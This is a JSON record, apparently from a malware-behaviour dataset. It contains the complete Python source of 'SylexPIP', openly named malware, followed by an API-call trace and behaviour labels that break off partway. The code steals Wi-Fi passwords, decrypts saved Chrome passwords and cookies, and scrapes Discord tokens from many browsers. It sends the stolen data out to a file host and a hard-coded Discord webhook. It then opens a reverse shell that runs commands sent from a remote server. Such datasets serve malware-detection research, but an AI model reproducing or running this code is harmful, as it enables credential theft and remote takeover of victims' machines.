[
  {
    "pyfile": "__main__.py",
    "code_snippet": "import re, os, time, shutil, sqlite3, base64, json, sys, string\nimport socket as sock\nimport subprocess as sp\nfrom random import choice\nfrom requests import get, post\nfrom datetime import datetime, timedelta\nfrom uuid import getnode\nfrom win32crypt import CryptUnprotectData\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)\n\nclass VARIABLES:\n    webhook    = \"https://discord.com/api/webhooks/1085607111062454374/bnEvq061GcWHDip-IEF1IJwvOjmVQXhWJMQeFhGK95Edy5QLx1FPkXbDpnB97tebw566\" # your discord webhook\n    printOnEnd = False # True = don't print endText when program finished - False = don't print\n    endText    = \"PROGRAM FINISHED\" # change this to whatever you want to print when the program finishes\n    REVSHELL  = True # False = dont connect to your shell - True = try to connect to your shell\n    serverip  = \"192.168.1.37\" # your server/host ip for victim to connect to \n    buffer    = 1024 # buffer to send (in bytes) each packet\n    port      = 4444 # server port to connect to\n\nclass EVIL:\n    \"\"\" SylexPIP Malware \"\"\"\n\n    class LOGGER:\n        \"\"\" Discord/System grabbing \"\"\"\n        def __init__(self):\n            self.errors  = \"\"\n            self.INFO    = {'System': pf.system(), 'Release': pf.release(),\n            'Version': pf.version(), 'Arch': pf.machine(),\n            'Host': sock.gethostname(), 'Local IP': sock.gethostbyname(sock.gethostname()),\n            'IP Addr': get(\"https://icanhazip.com\").text.split(\"\\n\")[0], 'MAC Addr': ':'.join(re.findall('..', '%012x' % getnode()))\n            }\n\n        def RndFileName(self):\n            rnd = ''.join(choice(string.ascii_letters) for i in range(6))\n            return f\"C:\\\\ProgramData\\\\{rnd}.txt\"\n\n        def UploadFile(self, filepath, filename=\"File\") -> str:\n            server = 'https://store4.gofile.io/uploadFile'\n            try:\n                file = {'file': open(filepath, \"rb\")}\n                resp = post(server, files=file).json()\n                filelink = f\"[{filename}]({resp['data']['downloadPage']})\"\n            except Exception as error:\n                LOGGER.errors += f\"{error}\\n\"\n                filelink = \"Upload Error\"\n            return filelink\n\n        def ErrorLog(self) -> str:\n            randomfilename = LOGGER.RndFileName()\n            with open(randomfilename, 'w') as file:\n                file.write(str(self.errors))\n                file.close()\n                return self.UploadFile(randomfilename, filename=\"System Error Log\") \\\n                    if self.errors != \"\" else \"No System Error Log\"\n\n        class GetWifiPasswords:\n            \"\"\" Write wifi passwords to file and upload \"\"\"\n            def __init__(self):\n                self.command = \"netsh wlan show profile\"\n                self.passwords = \"\"\n                \n            def Passwords(self) -> str:\n                networks = sp.check_output(self.command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                networks = networks.decode(encoding=\"latin-1\", errors=\"strict\")\n                network_list = re.findall(\"(?:Profile\\s*:\\s)(.*)\", networks) \n\n                for network_name in network_list:\n                    try:\n                        command = \"netsh wlan show profile \" + network_name + \" key=clear\"\n                        current_result = sp.check_output(command, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)\n                        current_result = current_result.decode(encoding=\"latin-1\", errors=\"strict\")        \n                        \n                        ssid = re.findall(\"(?:SSID name\\s*:\\s)(.*)\", str(current_result))\n                        authentication = re.findall(r\"(?:Authentication\\s*:\\s)(.*)\", current_result)\n                        cipher = re.findall(\"(?:Cipher\\s*:\\s)(.*)\", current_result)\n                        security_key = re.findall(r\"(?:Security key\\s*:\\s)(.*)\", current_result)\n                        password = re.findall(\"(?:Key Content\\s*:\\s)(.*)\", current_result)\n                        \n                        self.passwords += f\"\\n\\nSSID           : {ssid[0]}\"\n                        self.passwords += f\"Authentication : {authentication[0]}\"\n                        self.passwords += f\"Cipher         : {cipher[0]}\"\n                        self.passwords += f\"Security Key   : {security_key[0]}\"\n                        self.passwords += f\"Password       : {password[0]}\"\n                    except Exception as error:\n                        LOGGER.errors += f\"{error}\\n\"\n\n                return self.passwords\n\n            def Main(self) -> str:\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.Passwords()))\n                    file.close()\n                return LOGGER.UploadFile(randomfilename, filename=\"WiFi Passwords\")\n\n\n        class GetChromePasswords:\n            \"\"\" Decrypt all saved chrome passwords and upload file \"\"\"\n            def __init__(self):\n                self.passwordlog = \"\"\n                self.APP_DATA_PATH   = os.environ['LOCALAPPDATA']\n                self.DB_PATH         = r'Google\\Chrome\\User Data\\Default\\Login Data'\n                self.NONCE_BYTE_SIZE = 12\n\n            def AddPassword(self, db_file):\n                conn = sqlite3.connect(db_file)\n                _sql = 'select signon_realm,username_value,password_value from logins'\n                for row in conn.execute(_sql):\n                    host = row[0]\n                    if host.startswith('android'):\n                        continue\n                    name = row[1]\n                    value = self.ChromeDecrypt(row[2])\n                    _info = 'Hostname: %s\\nUsername: %s\\nPassword: %s\\n\\n' %(host,name,value)\n                    self.passwordlog += _info\n                conn.close()\n                os.remove(db_file)\n\n            def ChromeDecrypt(self, encrypted_txt):\n                if encrypted_txt[:4] == b'\\x01\\x00\\x00\\x00':\n                    decryptedtxt = self.DecryptDPAPI(encrypted_txt)\n                    return decryptedtxt.decode()\n                elif encrypted_txt[:3] == b'v10':\n                    decryptedtxt = self.DecryptAES(encrypted_txt)\n                    return decryptedtxt[:-16].decode()\n\n            def Decrypt(self, cipher, ciphertext, nonce):\n                cipher.mode = modes.GCM(nonce)\n                decryptor = cipher.decryptor()\n                return decryptor.update(ciphertext)\n\n            def GetCipher(self, key):\n                cipher = Cipher(\n                    algorithms.AES(key),\n                    None,\n                    backend=default_backend()\n                )\n                return cipher\n\n            def DecryptDPAPI(self, encrypted):\n                import ctypes\n                import ctypes.wintypes\n\n                class DATA_BLOB(ctypes.Structure):\n                    _fields_ = [('cbData', ctypes.wintypes.DWORD),\n                                ('pbData', ctypes.POINTER(ctypes.c_char))]\n\n                p = ctypes.create_string_buffer(encrypted, len(encrypted))\n                blobin = DATA_BLOB(ctypes.sizeof(p), p)\n                blobout = DATA_BLOB()\n                retval = ctypes.windll.crypt32.CryptUnprotectData(\n                    ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\n                if not retval:\n                    raise ctypes.WinError()\n                result = ctypes.string_at(blobout.pbData, blobout.cbData)\n                ctypes.windll.kernel32.LocalFree(blobout.pbData)\n                return result\n\n            def LocalKey(self):\n                jsn = None\n                with open(os.path.join(os.environ['LOCALAPPDATA'], r\"Google\\Chrome\\User Data\\Local State\"), encoding='latin-1', mode =\"r\") as f:\n                    jsn = json.loads(str(f.readline()))\n                return jsn[\"os_crypt\"][\"encrypted_key\"]\n\n            def DecryptAES(self, encrypted_txt):\n                encoded_key   = self.LocalKey()\n                encrypted_key = base64.b64decode(encoded_key.encode())\n                encrypted_key = encrypted_key[5:]\n                key           = self.DecryptDPAPI(encrypted_key)\n                nonce         = encrypted_txt[3:15]\n                cipher        = self.GetCipher(key)\n                return self.Decrypt(cipher, encrypted_txt[15:], nonce)\n\n            def Main(self):\n                _full_path = os.path.join(self.APP_DATA_PATH, self.DB_PATH)\n                _temp_path = os.path.join(self.APP_DATA_PATH, 'sqlite_file')\n                shutil.copyfile(_full_path,_temp_path)\n                self.AddPassword(_temp_path)\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    file.write(str(self.passwordlog))\n                    file.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Passwords\")\n\n\n        class GetChromeCookies:\n            \"\"\" Get Chrome Cookies - Current error: can't decrypt cookies \"\"\"\n            def __init__(self):\n                local_state_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\")\n                with open(local_state_path, \"r\", encoding=\"latin-1\") as f: local_state = json.loads(f.read())\n                key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]\n                self.key = CryptUnprotectData(key, None, None, None, 0)[1]\n\n            def TimeReadable(self, chromedate):\n                if chromedate != 86400000000 and chromedate:\n                    try: return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)\n                    except Exception as error: LOGGER.errors += f\"{error}\\n\"\n                else: return \"\"\n\n            def DecryptData(self, data, key):\n                try:\n                    from Crypto.Cipher import AES\n                    iv = data[3:15]\n                    data = data[15:]\n                    cipher = AES.new(key, AES.MODE_GCM, iv)\n                    return cipher.Decrypt(data)[:-16].decode()\n                except:\n                    try: return str(CryptUnprotectData(data, None, None, None, 0)[1])\n                    except: return \"\"\n\n            def Main(self):\n                db_path = os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Network\", \"Cookies\")\n                filename = \"Cookies.db\"\n                if not os.path.isfile(filename):\n                    shutil.copyfile(db_path, filename)\n                db = sqlite3.connect(filename)\n                db.text_factory = lambda b: b.decode(errors=\"ignore\")\n                cursor = db.cursor()\n                cursor.execute(\"\"\"\n                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value \n                FROM cookies\"\"\")\n                key = self.key\n                try:\n                    randomfilename = LOGGER.RndFileName()\n                    with open(randomfilename, 'w', encoding=\"latin-1\") as file:\n                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():\n                            decrypted_value = self.DecryptData(encrypted_value, key) if not value else value\n                            file.write(f\"\"\"\n                                URL: {host_key}\n                                Cookie name: {name}\n                                Cookie value (encrypted): {encrypted_value}\n                                Cookie value (decrypted): {decrypted_value}\n                                Creation date: {self.TimeReadable(creation_utc)}\n                                Last accessed: {self.TimeReadable(last_access_utc)}\n                                Expires at: {self.TimeReadable(expires_utc)}\n                            \"\"\")\n                            cursor.execute(\"\"\"\n                            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\n                            WHERE host_key = ?\n                            AND name = ?\"\"\", (decrypted_value, host_key, name))\n                        file.close()\n                    db.commit()\n                    db.close()\n                    return LOGGER.UploadFile(randomfilename, filename=\"Chrome Cookies\")\n                except Exception as error:\n                    LOGGER.errors += f\"{error}\\n\"\n                    return \"No Chrome Cookie File\"\n\n\n        class DiscordTokens:\n            \"\"\" Scrape local & browser Discord tokens \"\"\"\n            def __init__(self):\n                self.tokens = []\n                self.rawtokens = \"\"\n                self.tokeninfo = \"\"\n\n            def GetTokens(self) -> None:\n                LOCAL = os.getenv(\"LOCALAPPDATA\")\n                ROAMING = os.getenv(\"APPDATA\")\n                PATHS = {\n                    \"Discord\"               : ROAMING + \"\\\\Discord\",\n                    \"Discord Canary\"        : ROAMING + \"\\\\discordcanary\",\n                    \"Discord PTB\"           : ROAMING + \"\\\\discordptb\",\n                    \"Google Chrome\"         : LOCAL + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\",\n                    \"Opera\"                 : ROAMING + \"\\\\Opera Software\\\\Opera Stable\",\n                    \"Brave\"                 : LOCAL + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\",\n                    \"Yandex\"                : LOCAL + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\",\n                    'Lightcord'             : ROAMING + \"\\\\Lightcord\",\n                    'Opera GX'              : ROAMING + \"\\\\Opera Software\\\\Opera GX Stable\",\n                    'Amigo'                 : LOCAL + \"\\\\Amigo\\\\User Data\",\n                    'Torch'                 : LOCAL + \"\\\\Torch\\\\User Data\",\n                    'Kometa'                : LOCAL + \"\\\\Kometa\\\\User Data\",\n                    'Orbitum'               : LOCAL + \"\\\\Orbitum\\\\User Data\",\n                    'CentBrowser'           : LOCAL + \"\\\\CentBrowser\\\\User Data\",\n                    '7Star'                 : LOCAL + \"\\\\7Star\\\\7Star\\\\User Data\",\n                    'Sputnik'               : LOCAL + \"\\\\Sputnik\\\\Sputnik\\\\User Data\",\n                    'Vivaldi'               : LOCAL + \"\\\\Vivaldi\\\\User Data\\\\Default\",\n                    'Chrome SxS'            : LOCAL + \"\\\\Google\\\\Chrome SxS\\\\User Data\",\n                    'Epic Privacy Browser'  : LOCAL + \"\\\\Epic Privacy Browser\\\\User Data\",\n                    'Microsoft Edge'        : LOCAL + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\",\n                    'Uran'                  : LOCAL + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\",\n                    'Iridium'               : LOCAL + \"\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveld\",\n                    'Firefox'               : ROAMING + \"\\\\Mozilla\\\\Firefox\\\\Profiles\",\n                }\n                \n                for platform, path in PATHS.items():\n                    path = os.path.join(path, \"Local Storage\", \"leveldb\")\n                    if os.path.exists(path):\n                        for file_name in os.listdir(path):\n                            if file_name.endswith(\".log\") or file_name.endswith(\".ldb\") or file_name.endswith(\".sqlite\"):\n                                for line in [x.strip() for x in open(os.path.join(path, file_name), errors=\"ignore\").readlines() if x.strip()]:\n                                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", r\"mfa\\.[\\w-]{84}\"):\n                                        for token in re.findall(regex, line):\n                                            if token + \" -> \" + platform not in self.tokens:\n                                                self.tokens.append(token + \" -> \" + platform)\n                                                self.rawtokens += f\"\\n{token}\\n\"\n                return self.tokens\n\n            def Main(self):\n                self.GetTokens()\n                randomfilename = LOGGER.RndFileName()\n                with open(randomfilename, 'w') as file:\n                    for index in range(len(self.tokens)):\n                        self.tokeninfo += f\"[{index+1}] {self.tokens[index]}\\n\"\n                    file.write(str(self.tokeninfo))\n                    file.close()\n\n                return LOGGER.UploadFile(randomfilename, filename=\"Token File\"), self.rawtokens\n\n            def Valid(self, token):\n                \"\"\" Currently not used \"\"\"\n                headers = { 'Authorization': token, 'Content-Type': 'application/json' }\n                r = get('https://discordapp.com/api/v9/users/@me', headers=headers)\n                return True if r.status_code == 200 else False\n\n\n        def Main(self):\n            \"\"\" Get information and construct embed \"\"\"\n            WifiPass   = self.GetWifiPasswords()\n            ChromePass = self.GetChromePasswords()\n            ChromeCks  = self.GetChromeCookies()\n            DiscTokens = self.DiscordTokens()\n            wifi_passwords   = WifiPass.Main()\n            chrome_passwords = ChromePass.Main()\n            chrome_cookies   = ChromeCks.Main()\n            discord_tokens   = DiscTokens.Main()\n\n            system_info = \"\"\n            for key in self.INFO:\n                system_info += f\"{key} : {self.INFO[key]}\\n\"\n\n            embed = {\n                \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Tokens**\",\n                                \"value\": f\"```{discord_tokens[1]}```\"\n                            },\n                            {\n                                \"name\": \"System Information\",\n                                \"value\": f\"```{system_info}```\"\n                            },\n                            {\n                                \"name\": \"Python Version\",\n                                \"value\": f\"```{pf.python_version()}```\"\n                            },\n                            {\n                                \"name\": \"System Files\",\n                                \"value\": f\"**{discord_tokens[0]}**\\n**{wifi_passwords}**\\n**{chrome_passwords}**\\n**{chrome_cookies}**\\n**{self.ErrorLog()}**\"\n                            }\n                        ],\n                        \"author\": {\n                            \"name\": f\"SylexPIP ✔️\"\n                        },\n                        \"footer\": {\n                            \"text\": f\"github.com/codeuk/sylexpip\"\n                        },\n                    }\n\n            heading = {\n                \"content\": f\"**SylexPIP Executed** ||@everyone||\",\n                \"embeds\": [embed],\n                \"username\": \"SylexPIP\"\n            }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n            NETWORK = PROGRAM.NETWORK()\n            NETWORK.Main() if VARIABLES.REVSHELL else NETWORK.Persistence()\n\n\n    class NETWORK:\n        \"\"\" RAT/Reverse Shell (Isn't very good ATM)\"\"\"\n        def __init__(self):\n            self.ip = get(\"https://icanhazip.com\").text.split(\"\\n\")[0]\n            self.cwd = os.getcwd()\n\n        def Persistence(self):\n            return None\n\n        def onLoad(self):\n            embed = {\n                        \"color\": 0x000000,\n                        \"fields\": [\n                            {\n                                \"name\": \"**Reverse Shell Connected**\",\n                                \"value\": f\"```{self.ip} -> {VARIABLES.serverip}:{VARIABLES.port}```\"\n                            },\n                            {\n                                \"name\": \"**Configuration**\",\n                                \"value\": f\"\"\"```PORT -> {VARIABLES.port}\\nIP   -> {self.ip}\\\n                                    \\nBUFFER -> {VARIABLES.buffer}\\nSERVER -> {VARIABLES.serverip}```\"\"\"\n                            }\n                        ],\n                        \"author\": {\"name\": f\"SylexPIP ✔️\"},\n                        \"footer\": {\"text\": f\"github.com/codeuk/sylexpip\"},\n                    }\n            heading = { \"content\": \"\", \"embeds\": [embed], \"username\": \"SylexPIP\" }\n            req = post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())\n\n        def Main(self):\n            \"\"\" currently working on the localtunnel function and getting the tunnel link automatically... \"\"\"\n            s = sock.socket()\n            s.connect((VARIABLES.serverip, VARIABLES.port))\n            s.send(self.cwd.encode())\n            self.onLoad()\n\n            while True:\n                try:\n                    command = s.recv(VARIABLES.buffer).decode()\n                    split_command = command.split()\n                    if split_command[0] == \"localtunnel\":\n                        try:\n                            tunnel_port = split_command[1]\n                            tunnel_inst = sp.getoutput(\"npm install -g localtunnel\")\n                            tunnel_link = sp.getoutput(f\"lt --port {tunnel_port}\")\n                            http_server = sp.getoutput(f\"python -m http.server --directory C:// {tunnel_port}\")\n                            output = f\"[*] Started localtunnel @ {tunnel_link}\"\n                        except Exception as error:\n                            output = \"[!] Couldn't start localtunnel: \", error\n                    elif command.lower() == \"exit\":\n                        break\n                    else:\n                        output = sp.getoutput(command)\n                    message = f\"{output}\\n\"\n                    s.send(message.encode())\n                except Exception as error:\n                    s.send(\"[!] Error on client side!\".encode())\n            s.close()\n\nPROGRAM = EVIL()\nLOGGER  = PROGRAM.LOGGER()\nLOGGER.Main()\nprint(VARIABLES.endText if VARIABLES.printOnEnd else \"\")",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "platform.release",
        "platform.version",
        "platform.machine",
        "socket.gethostname",
        "socket.gethostbyname",
        "requests.get",
        "uuid.getnode",
        "re.findall",
        "random.choice",
        "open",
        "requests.post",
        "open",
        "open",
        "subprocess.check_output",
        "subprocess.check_output",
        "re.findall",
        "re.findall",
        "re.findall",
        "re.findall",
        "re.findall",
        "open",
        "os.environ",
        "os.path.join",
        "os.path.join",
        "shutil.copyfile",
        "sqlite3.connect",
        "sqlite3.Connection.execute",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt",
        "sqlite3.Connection.close",
        "os.remove",
        "open",
        "os.environ",
        "os.path.join",
        "open",
        "json.loads",
        "base64.b64decode",
        "win32crypt.CryptUnprotectData",
        "os.path.join",
        "os.path.isfile",
        "shutil.copyfile",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "EVIL.LOGGER.GetChromeCookies.DecryptData",
        "open",
        "sqlite3.Cursor.execute",
        "sqlite3.Connection.commit",
        "sqlite3.Connection.close",
        "os.getenv",
        "os.getenv",
        "os.path.exists",
        "os.listdir",
        "open",
        "re.findall",
        "open",
        "requests.post",
        "requests.get",
        "json.dumps",
        "socket.socket",
        "socket.socket.connect",
        "socket.socket.send",
        "EVIL.NETWORK.onLoad",
        "socket.socket.recv",
        "subprocess.getoutput",
        "subprocess.getoutput",
        "subprocess.getoutput",
        "socket.socket.send",
        "socket.socket.send",
        "socket.socket.close"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "platform.release()",
        "platform.version()",
        "platform.machine()",
        "socket.gethostname()",
        "socket.gethostbyname(socket.gethostname())",
        "requests.get(\"https://icanhazip.com\")",
        "uuid.getnode()",
        "re.findall('..', '%012x' % getnode())",
        "random.choice(string.ascii_letters)",
        "open(filepath, \"rb\")",
        "requests.post(server, files=file)",
        "open(randomfilename, 'w')",
        "open(randomfilename, 'w')",
        "subprocess.check_output(self.command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)",
        "subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)",
        "re.findall(\"(?:SSID name\\s*:\\s)(.*)\", str(current_result))",
        "re.findall(r\"(?:Authentication\\s*:\\s)(.*)\", current_result)",
        "re.findall(\"(?:Cipher\\s*:\\s)(.*)\", current_result)",
        "re.findall(r\"(?:Security key\\s*:\\s)(.*)\", current_result)",
        "re.findall(\"(?:Key Content\\s*:\\s)(.*)\", current_result)",
        "open(randomfilename, 'w')",
        "os.environ['LOCALAPPDATA']",
        "os.path.join(os.environ['LOCALAPPDATA'], r\"Google\\Chrome\\User Data\\Local State\")",
        "os.path.join(self.APP_DATA_PATH, self.DB_PATH)",
        "os.path.join(self.APP_DATA_PATH, 'sqlite_file')",
        "shutil.copyfile(_full_path, _temp_path)",
        "sqlite3.connect(db_file)",
        "conn.execute(_sql)",
        "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt(row[2])",
        "conn.close()",
        "os.remove(db_file)",
        "open(randomfilename, 'w')",
        "os.environ[\"USERPROFILE\"]",
        "os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Local State\")",
        "open(local_state_path, \"r\", encoding=\"latin-1\")",
        "json.loads(f.read())",
        "base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])[5:]",
        "win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]",
        "os.path.join(os.environ[\"USERPROFILE\"], \"AppData\", \"Local\", \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Network\", \"Cookies\")",
        "os.path.isfile(filename)",
        "shutil.copyfile(db_path, filename)",
        "sqlite3.connect(filename)",
        "db.cursor()",
        "cursor.execute(\"SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies\")",
        "EVIL.LOGGER.GetChromeCookies.DecryptData(encrypted_value, key)",
        "open(randomfilename, 'w', encoding=\"latin-1\")",
        "cursor.execute(\"UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?\", (decrypted_value, host_key, name))",
        "db.commit()",
        "db.close()",
        "os.getenv(\"LOCALAPPDATA\")",
        "os.getenv(\"APPDATA\")",
        "os.path.exists(path)",
        "os.listdir(path)",
        "open(os.path.join(path, file_name), errors=\"ignore\")",
        "re.findall(regex, line)",
        "open(randomfilename, 'w')",
        "requests.post(VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode())",
        "requests.get(\"https://icanhazip.com\")",
        "json.dumps(heading).encode()",
        "socket.socket()",
        "socket.socket.connect((VARIABLES.serverip, VARIABLES.port))",
        "socket.socket.send(self.cwd.encode())",
        "EVIL.NETWORK.onLoad()",
        "socket.socket.recv(VARIABLES.buffer).decode()",
        "subprocess.getoutput(\"npm install -g localtunnel\")",
        "subprocess.getoutput(f\"lt --port {tunnel_port}\")",
        "subprocess.getoutput(f\"python -m http.server --directory C:// {tunnel_port}\")",
        "socket.socket.send(message.encode())",
        "socket.socket.send(\"[!] Error on client side!\".encode())",
        "socket.socket.close()"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_platform_info",
          "description": "Retrieves platform information as string",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "platform.release",
          "id": "get_os_release",
          "description": "Retrieves operating system release version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "platform.version",
          "id": "get_os_version",
          "description": "Retrieves operating system version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "platform.machine",
          "id": "get_machine_type",
          "description": "Retrieves machine type, e.g., 'x86_64'",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "hardware_information"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostbyname",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "uuid.getnode",
          "id": "get_hardware_address",
          "description": "Retrieves hardware address as 48-bit integer",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "random.choice",
          "id": "apply_lambda_elements",
          "description": "Applies lambda to elements of two lists",
          "first_id": "data_transformation_processing",
          "second_id": "function_application",
          "third_id": "lambda_application"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "subprocess.check_output",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.check_output",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "EVIL.LOGGER.GetChromePasswords.ChromeDecrypt",
          "id": "decrypt_chrome_password",
          "description": "Decrypts Chrome password value",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "password_theft"
        },
        {
          "api_name": "sqlite3.Connection.close",
          "id": "close_sqlite_connection",
          "description": "Closes the SQLite database connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
